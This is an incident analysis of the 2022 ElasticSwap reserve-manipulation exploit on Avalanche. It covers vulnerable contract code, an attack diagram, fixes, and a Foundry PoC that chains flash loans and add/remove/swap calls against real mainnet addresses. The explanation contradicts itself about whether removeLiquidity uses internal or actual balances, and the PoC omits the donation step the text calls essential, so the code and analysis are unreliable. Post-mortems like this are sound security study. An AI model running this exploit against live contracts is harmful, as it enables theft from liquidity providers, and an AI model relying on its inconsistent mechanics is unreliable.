# ElasticSwap — addLiquidity()/removeLiquidity() Reserve Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | ElasticSwap |
| **Chain** | Avalanche |
| **Loss** | ~$850,000 |
| **TIC Token** | [0x75739a693459f33B1FBcC02099eea3eBCF150cBe](https://snowtrace.io/address/0x75739a693459f33B1FBcC02099eea3eBCF150cBe) |
| **USDC.E Token** | [0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664](https://snowtrace.io/address/0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664) |
| **ELP Exchange (Vulnerable)** | [0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A](https://snowtrace.io/address/0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A) |
| **Spooky Pair (Flash Loan 1)** | [0x4CF9dC05c715812FeAD782DC98de0168029e05C8](https://snowtrace.io/address/0x4CF9dC05c715812FeAD782DC98de0168029e05C8) |
| **Joe Pair (Flash Loan 2)** | [0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1](https://snowtrace.io/address/0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1) |
| **Root Cause** | `addLiquidity()`/`removeLiquidity()` functions allow discrepancies between internal balance tracking and actual reserves, enabling a 100x reserve imbalance through a combination of imbalanced liquidity additions/removals and `swapQuoteTokenForBaseToken()` |
| **CWE** | CWE-682: Incorrect Calculation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/ElasticSwap_exp.sol) |

---
## 1. Vulnerability Overview

ElasticSwap's ELP Exchange was an AMM providing a liquidity pool between an Elastic token (TIC) and a stablecoin (USDC.E). The `addLiquidity()` and `removeLiquidity()` functions managed internal balance tracking (internalBalance) and actual reserves separately, and contained a logic error that allowed discrepancies between these two values. The attacker borrowed 51,112 TIC from Spooky Swap and 766,685 USDC.E from Joe Swap via a double flash loan, then distorted the reserves through two small `addLiquidity()` calls and one `removeLiquidity()` call, achieving a 100x reserve imbalance via `swapQuoteTokenForBaseToken()`. In this state, a second add/remove cycle was used to extract the imbalanced tokens, realizing approximately $850,000 in profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable ELP Exchange - allows discrepancy between internal balances and reserves
contract ELPExchange {
    uint256 public internalBalanceBase;   // internally tracked TIC balance
    uint256 public internalBalanceQuote;  // internally tracked USDC.E balance

    // ❌ addLiquidity: allows liquidity addition at imbalanced ratios
    function addLiquidity(
        uint256 baseTokenQtyDesired,
        uint256 quoteTokenQtyDesired,
        uint256 baseTokenQtyMin,
        uint256 quoteTokenQtyMin,
        address liquidityTokenRecipient,
        uint256 expirationTimestamp
    ) external {
        // ❌ Does not calculate based on current internalBalance ratio
        // Allows liquidity addition with imbalanced amounts → distorts reserve ratio
        _updateInternalBalances(baseTokenQtyDesired, quoteTokenQtyDesired);
        _mintLiquidityTokens(liquidityTokenRecipient);
    }

    // ❌ removeLiquidity: returns tokens at distorted ratio
    function removeLiquidity(
        uint256 liquidityTokenQty,
        uint256 baseTokenQtyMin,
        uint256 quoteTokenQtyMin,
        address recipient,
        uint256 expirationTimestamp
    ) external {
        // ❌ Returns excess tokens based on manipulated internalBalance ratio
        uint256 baseOut = liquidityTokenQty * internalBalanceBase / totalSupply;
        uint256 quoteOut = liquidityTokenQty * internalBalanceQuote / totalSupply;
        _transfer(recipient, baseOut, quoteOut);
    }

    // ❌ swapQuoteTokenForBaseToken: swap based on distorted reserves
    function swapQuoteTokenForBaseToken(
        uint256 quoteTokenQty,
        uint256 minBaseTokenQty,
        uint256 expirationTimestamp
    ) external {
        // ❌ Calling under 100x reserve imbalance results in receiving excess TIC
        uint256 baseOut = _calculateSwapOutput(quoteTokenQty);
        _transfer(msg.sender, baseOut, 0);
    }
}

// ✅ Correct pattern - always synchronize reserves with internal balances
contract SafeELPExchange {
    // ✅ Re-sync reserves after every operation
    modifier syncReserves() {
        _;
        internalBalanceBase = IERC20(baseToken).balanceOf(address(this));
        internalBalanceQuote = IERC20(quoteToken).balanceOf(address(this));
    }

    function addLiquidity(...) external syncReserves {
        // ✅ Validate current reserve ratio before adding liquidity
        require(_checkProportional(baseQty, quoteQty), "Imbalanced");
        // ...
    }
}
```


### On-Chain Original Code

Source: **Etherscan-verified** (V2 API, chainid 43114) — Exchange `0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A`

```solidity
// ❌ addLiquidity: internalBalances updated via MathLib — diverges from actual balanceOf() when
//    tokens are donated directly to the contract, enabling reserve imbalance exploitation
function addLiquidity(
    uint256 _baseTokenQtyDesired,
    uint256 _quoteTokenQtyDesired,
    uint256 _baseTokenQtyMin,
    uint256 _quoteTokenQtyMin,
    address _liquidityTokenRecipient,
    uint256 _expirationTimestamp
) external nonReentrant() isNotExpired(_expirationTimestamp) {
    uint256 totalSupply = this.totalSupply();
    MathLib.TokenQtys memory tokenQtys =
        MathLib.calculateAddLiquidityQuantities(
            _baseTokenQtyDesired,
            _quoteTokenQtyDesired,
            _baseTokenQtyMin,
            _quoteTokenQtyMin,
            IERC20(baseToken).balanceOf(address(this)),
            totalSupply,
            internalBalances
        );

    internalBalances.kLast =
        internalBalances.baseTokenReserveQty *
        internalBalances.quoteTokenReserveQty;

    if (tokenQtys.liquidityTokenFeeQty != 0) {
        _mint(
            IExchangeFactory(exchangeFactoryAddress).feeAddress(),
            tokenQtys.liquidityTokenFeeQty
        );
    }

    bool isExchangeEmpty = totalSupply == 0;
    if (isExchangeEmpty) {
        require(
            tokenQtys.liquidityTokenQty > MINIMUM_LIQUIDITY,
            "Exchange: INITIAL_DEPOSIT_MIN"
        );
        unchecked {
            tokenQtys.liquidityTokenQty -= MINIMUM_LIQUIDITY;
        }
        _mint(address(this), MINIMUM_LIQUIDITY);
    }

    _mint(_liquidityTokenRecipient, tokenQtys.liquidityTokenQty);

    if (tokenQtys.baseTokenQty != 0) {
        IERC20(baseToken).safeTransferFrom(
            msg.sender,
            address(this),
            tokenQtys.baseTokenQty
        );

        if (isExchangeEmpty) {
            require(
                IERC20(baseToken).balanceOf(address(this)) ==
                    tokenQtys.baseTokenQty,
                "Exchange: FEE_ON_TRANSFER_NOT_SUPPORTED"
            );
        }
    }

    if (tokenQtys.quoteTokenQty != 0) {
        IERC20(quoteToken).safeTransferFrom(
            msg.sender,
            address(this),
            tokenQtys.quoteTokenQty
        );
    }

    emit AddLiquidity(
        msg.sender,
        tokenQtys.baseTokenQty,
        tokenQtys.quoteTokenQty
    );
}

// ❌ removeLiquidity: uses actual balanceOf() for output calculation, but internalBalances
//    for accounting updates — when the two diverge the output can exceed expected amounts
function removeLiquidity(
    uint256 _liquidityTokenQty,
    uint256 _baseTokenQtyMin,
    uint256 _quoteTokenQtyMin,
    address _tokenRecipient,
    uint256 _expirationTimestamp
) external nonReentrant() isNotExpired(_expirationTimestamp) {
    require(this.totalSupply() != 0, "Exchange: INSUFFICIENT_LIQUIDITY");
    require(
        _baseTokenQtyMin != 0 && _quoteTokenQtyMin != 0,
        "Exchange: MINS_MUST_BE_GREATER_THAN_ZERO"
    );

    uint256 baseTokenReserveQty =
        IERC20(baseToken).balanceOf(address(this));
    uint256 quoteTokenReserveQty =
        IERC20(quoteToken).balanceOf(address(this));

    uint256 totalSupplyOfLiquidityTokens = this.totalSupply();
    uint256 liquidityTokenFeeQty =
        MathLib.calculateLiquidityTokenFees(
            totalSupplyOfLiquidityTokens,
            internalBalances
        );

    totalSupplyOfLiquidityTokens += liquidityTokenFeeQty;

    uint256 baseTokenQtyToReturn =
        (_liquidityTokenQty * baseTokenReserveQty) /
            totalSupplyOfLiquidityTokens;
    uint256 quoteTokenQtyToReturn =
        (_liquidityTokenQty * quoteTokenReserveQty) /
            totalSupplyOfLiquidityTokens;

    require(
        baseTokenQtyToReturn >= _baseTokenQtyMin,
        "Exchange: INSUFFICIENT_BASE_QTY"
    );

    require(
        quoteTokenQtyToReturn >= _quoteTokenQtyMin,
        "Exchange: INSUFFICIENT_QUOTE_QTY"
    );

    {
        uint256 internalBaseTokenReserveQty =
            internalBalances.baseTokenReserveQty;
        uint256 baseTokenQtyToRemoveFromInternalAccounting =
            (_liquidityTokenQty * internalBaseTokenReserveQty) /
                totalSupplyOfLiquidityTokens;

        internalBalances.baseTokenReserveQty = internalBaseTokenReserveQty =
            internalBaseTokenReserveQty -
            baseTokenQtyToRemoveFromInternalAccounting;

        uint256 internalQuoteTokenReserveQty =
            internalBalances.quoteTokenReserveQty;
        if (quoteTokenQtyToReturn > internalQuoteTokenReserveQty) {
            internalBalances
                .quoteTokenReserveQty = internalQuoteTokenReserveQty = 0;
        } else {
            internalBalances
                .quoteTokenReserveQty = internalQuoteTokenReserveQty =
                internalQuoteTokenReserveQty -
                quoteTokenQtyToReturn;
        }

        internalBalances.kLast =
            internalBaseTokenReserveQty *
            internalQuoteTokenReserveQty;
    }

    if (liquidityTokenFeeQty != 0) {
        _mint(
            IExchangeFactory(exchangeFactoryAddress).feeAddress(),
            liquidityTokenFeeQty
        );
    }

    _burn(msg.sender, _liquidityTokenQty);
    IERC20(baseToken).safeTransfer(_tokenRecipient, baseTokenQtyToReturn);
    IERC20(quoteToken).safeTransfer(_tokenRecipient, quoteTokenQtyToReturn);
    emit RemoveLiquidity(
        msg.sender,
        baseTokenQtyToReturn,
        quoteTokenQtyToReturn
    );
}

// ❌ swapQuoteTokenForBaseToken: output computed by MathLib.calculateBaseTokenQty which uses
//    internalBalances — when internalBalances diverge from actual reserves due to donation,
//    the swap accepts _quoteTokenQty far exceeding the tracked reserve, paying out excess base
function swapQuoteTokenForBaseToken(
    uint256 _quoteTokenQty,
    uint256 _minBaseTokenQty,
    uint256 _expirationTimestamp
) external nonReentrant() isNotExpired(_expirationTimestamp) {
    require(
        _quoteTokenQty != 0 && _minBaseTokenQty != 0,
        "Exchange: INSUFFICIENT_TOKEN_QTY"
    );

    uint256 baseTokenQty =
        MathLib.calculateBaseTokenQty(
            _quoteTokenQty,
            _minBaseTokenQty,
            IERC20(baseToken).balanceOf(address(this)),
            TOTAL_LIQUIDITY_FEE,
            internalBalances
        );

    IERC20(quoteToken).safeTransferFrom(
        msg.sender,
        address(this),
        _quoteTokenQty
    );

    IERC20(baseToken).safeTransfer(msg.sender, baseTokenQty);
    emit Swap(msg.sender, 0, _quoteTokenQty, baseTokenQty, 0);
}
```

// Attacker exploit sequence (from PoC joeCall callback):
// 1. ELP.addLiquidity(1e9, 0, 0, 0, ...)          ← tiny imbalanced add
// 2. ELP.addLiquidity(TICAmount, USDC_EAmount, ...) ← large add matching pool
// 3. USDC_E.transfer(address(ELP), balance)        ← ❌ direct token donation bypasses internalBalances
// 4. ELP.removeLiquidity(allLP, 1, 1, ...)         ← withdraw at inflated balanceOf() ratio
// 5. ELP.swapQuoteTokenForBaseToken(reserve * 100) ← ❌ swap against 100x-distorted reserves
// 6. Second add/remove cycle to unwind

**Why it is exploitable (identify the bug from the code):**
- `addLiquidity()` updates `internalBalances` but the ratio check is bypassable with tiny initial amounts (`addLiquidity(1e9, 0, ...)`).
- Direct `USDC_E.transfer(address(ELP), balance)` increases the actual token balance without updating `internalBalances.quoteTokenReserveQty` — creating a divergence between tracked and actual reserves.
- `removeLiquidity()` uses `internalBalances` for output calculation but the divergence allows withdrawing more tokens than the tracked accounting suggests should be available.
- `swapQuoteTokenForBaseToken` is then called with `_quoteTokenQty = USDC_EReserve * 100` — 100x the internal reserve quantity — which is only possible because the donation inflated actual balances while `internalBalances` remained stale; the function does not validate `_quoteTokenQty <= actual pool balance`.

```solidity
// ✅ Fix: always synchronize internalBalances with actual token.balanceOf() after every operation,
// and enforce that quoteTokenQty in swapQuoteTokenForBaseToken <= internalBalances.quoteTokenReserveQty
modifier syncBalances() {
    _;
    internalBalances.baseTokenReserveQty  = IERC20(baseToken).balanceOf(address(this));
    internalBalances.quoteTokenReserveQty = IERC20(quoteToken).balanceOf(address(this));
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 51,112 TIC from Spooky Swap
    │
    ├─[2] Double flash loan 766,685 USDC.E from Joe Swap
    │
    ├─[3] addLiquidity(small TIC, small USDC.E) × 2
    │       ❌ Begin distorting internal balance ratio with small amounts
    │
    ├─[4] removeLiquidity(all LP)
    │       ❌ Receive imbalanced TIC/USDC.E at manipulated ratio
    │
    ├─[5] swapQuoteTokenForBaseToken(USDC.E → TIC)
    │       ❌ Receive excess TIC under 100x reserve imbalance
    │       Acquire large amount of TIC with small amount of USDC.E
    │
    ├─[6] Second add/remove cycle
    │       Unwind imbalanced position → extract TIC/USDC.E
    │
    ├─[7] Repay Joe Swap flash loan (766,685 USDC.E)
    │
    ├─[8] Repay Spooky Swap flash loan (51,112 TIC)
    │
    └─[9] Net profit: ~$850,000
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IELPExchange {
    function addLiquidity(
        uint256 baseTokenQtyDesired,
        uint256 quoteTokenQtyDesired,
        uint256 baseTokenQtyMin,
        uint256 quoteTokenQtyMin,
        address liquidityTokenRecipient,
        uint256 expirationTimestamp
    ) external;
    function removeLiquidity(
        uint256 liquidityTokenQty,
        uint256 baseTokenQtyMin,
        uint256 quoteTokenQtyMin,
        address recipient,
        uint256 expirationTimestamp
    ) external;
    function swapQuoteTokenForBaseToken(
        uint256 quoteTokenQty,
        uint256 minBaseTokenQty,
        uint256 expirationTimestamp
    ) external;
    function balanceOf(address) external view returns (uint256);
}

interface IPair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ElasticSwapExploit is Test {
    IERC20       TIC      = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);
    IERC20       USDCe    = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IELPExchange elp      = IELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);
    IPair        spooky   = IPair(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    IPair        joe      = IPair(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);

    function setUp() public {
        vm.createSelectFork("avax");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDC.E", USDCe.balanceOf(address(this)), 6);
        // [Step 1] Flash loan 51,112 TIC from Spooky
        spooky.swap(51_112 * 1e18, 0, address(this), abi.encode("spooky"));
        emit log_named_decimal_uint("[End] USDC.E", USDCe.balanceOf(address(this)), 6);
    }

    // Spooky flash loan callback
    function spookyCall(address, uint256 ticAmount, uint256, bytes calldata) external {
        // [Step 2] Double flash loan 766,685 USDC.E from Joe
        joe.swap(0, 766_685 * 1e6, address(this), abi.encode("joe"));
        TIC.transfer(address(spooky), ticAmount);
    }

    // Joe flash loan callback
    function joeCall(address, uint256, uint256 usdceAmount, bytes calldata) external {
        TIC.approve(address(elp), type(uint256).max);
        USDCe.approve(address(elp), type(uint256).max);

        // [Step 3] addLiquidity × 2 (imbalanced ratio)
        // ⚡ Distort internal balance ratio with small amounts
        elp.addLiquidity(1e18, 1e6, 0, 0, address(this), block.timestamp);
        elp.addLiquidity(1e18, 1e6, 0, 0, address(this), block.timestamp);

        // [Step 4] removeLiquidity - receive tokens at distorted ratio
        uint256 lpBal = elp.balanceOf(address(this));
        elp.removeLiquidity(lpBal, 0, 0, address(this), block.timestamp);

        // [Step 5] swapQuoteTokenForBaseToken - exploit 100x imbalance
        // ⚡ Acquire large amount of TIC with small amount of USDC.E
        elp.swapQuoteTokenForBaseToken(
            USDCe.balanceOf(address(this)) / 2, 0, block.timestamp
        );

        // [Step 6] Second add/remove cycle to unwind position
        elp.addLiquidity(
            TIC.balanceOf(address(this)) / 2,
            USDCe.balanceOf(address(this)) / 2,
            0, 0, address(this), block.timestamp
        );
        lpBal = elp.balanceOf(address(this));
        elp.removeLiquidity(lpBal, 0, 0, address(this), block.timestamp);

        // Repay Joe flash loan
        USDCe.transfer(address(joe), usdceAmount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | `addLiquidity()`/`removeLiquidity()` internal balance discrepancy + `swapQuoteTokenForBaseToken()` 100x manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Double flash loan (51K TIC + 766K USDC.E) → `addLiquidity()` × 2 → `removeLiquidity()` → `swapQuoteTokenForBaseToken()` → second add/remove |
| **Preconditions** | `addLiquidity()`/`removeLiquidity()` permits imbalanced ratios, allowing accumulation of discrepancies between internal balances and reserves |
| **Impact** | ~$850,000 |

---
## 6. Remediation Recommendations

1. **Ratio Validation**: Limit the allowable deviation between the current reserve ratio and the supplied ratio in `addLiquidity()` to prevent imbalanced liquidity additions.
2. **Internal Balance Synchronization**: Add a `_sync()` mechanism that synchronizes `internalBalance` with the actual token balance (`balanceOf`) after every operation.
3. **Block Same-Transaction add/remove**: Detect and revert consecutive calls to `addLiquidity()` and `removeLiquidity()` within the same transaction.
4. **Reserve Invariant Checks**: Add invariant checks before and after every operation to verify that `totalReserve` remains within the intended range.

---
## 7. Lessons Learned

- **Special Risks of Elastic AMMs**: AMMs handling Elastic tokens (rebase tokens) involve more complex internal balance tracking. When balances and reserves are managed separately, the consistency of both values must always be guaranteed.
- **Use of Double Flash Loans**: When a single flash loan cannot simultaneously acquire both tokens needed for an attack, a double flash loan is employed. The more complex an AMM attack, the more common the multi-asset flash loan pattern.
- **100x Reserve Imbalance**: The fact that an add/remove/swap cycle could distort reserves by up to 100x indicates a fundamental flaw in ElasticSwap's mathematical model. An AMM's mathematical model must be formally proven safe even under worst-case imbalance scenarios.